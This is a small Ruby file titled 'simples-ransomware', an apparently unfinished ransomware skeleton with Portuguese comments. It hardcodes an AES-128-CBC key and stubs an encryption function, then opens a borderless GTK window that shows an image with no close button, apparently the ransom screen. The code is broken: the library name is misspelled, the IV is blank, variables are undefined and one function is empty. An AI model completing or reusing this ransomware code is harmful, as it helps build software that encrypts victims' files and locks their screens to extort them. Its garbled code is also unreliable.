# simples-ransomware



require 'colorize'
require 'openssl'
require 'bcrypt'
require 'gtk3'



key = "chave12345678910"
iv = 


def criptografar()
OpenSLL::Cipher.new("AES-128-CBC")
Cipher.encrypt
cipher.key = key
cipher.iv = iv
end 

def tela_win()





end

-----------------------------------------------------------------------------------------



require 'gtk3'

# Cria a janela principal
window = Gtk::Window.new("Tela sem botão X")

# Remove barra de título e bordas (sem X, minimizar, etc.)
window.decorated = false

# Carrega uma imagem (use o caminho da sua imagem)
image = Gtk::Image.new(file: "sua_imagem.png")

# Adiciona a imagem à janela
window.add(image)

# Fecha ao pressionar ESC (opcional)
window.signal_connect("key-press-event") do |_, event|
  window.destroy if event.keyval == Gdk::Keyval::KEY_Escape
end

# Mostra tudo
window.show_all

# Inicia o loop do GTK
Gtk.main



















